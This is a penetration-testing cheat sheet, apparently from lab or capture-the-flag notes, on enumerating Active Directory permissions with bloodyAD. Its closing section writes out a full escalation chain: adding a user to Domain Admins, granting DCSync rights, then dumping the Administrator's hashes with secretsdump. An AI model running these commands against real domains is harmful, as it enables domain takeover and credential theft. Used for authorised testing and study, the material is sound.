**Requires:** Domain credentials and LDAP connectivity to the DC. For Kerberos, use the options supported by your installed version.

## Read membership for one domain identity

**Run in:** Kali. **Requires:** A compatible bloodyAD build and authenticated directory access to the chosen DC.

```bash
bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get membership USER
```

**What the result establishes:** Read the exact object, attribute or membership result and identify the right your principal holds.

**Next check:** Inspect the exact applicable object right and inheritance; a readable relationship is not a writable one.

## Read an object

**Kali**

```bash
bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get object TARGET_OBJECT
```

## Find writable objects

**Kali**

```bash
bloodyAD --host DC_FQDN -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable
```

A writable attribute or object is a specific permission, not automatic domain administrator access.

## If it fails

| Symptom | Check |
| --- | --- |
| An object relationship is visible but the proposed modification is denied | Read operations and modifying operations have different consequences; a writable attribute does not imply arbitrary control over the entire domain. |

### Group → DCSync chain (what we'd have done with bdavid if those edges were outbound)

**BloodHound: Full Reference**

```bash
# 1. add yourself to a powerful group (GenericAll/AddMember on it)
proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add groupMember "Domain Admins" <you>
# 2. or grant DCSync rights directly (WriteDacl on the domain)
proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add dcsync <you>
# 3. then replicate
proxychains impacket-secretsdump '<domain>/<you>:<pass>'@<DC> -just-dc-user Administrator
```
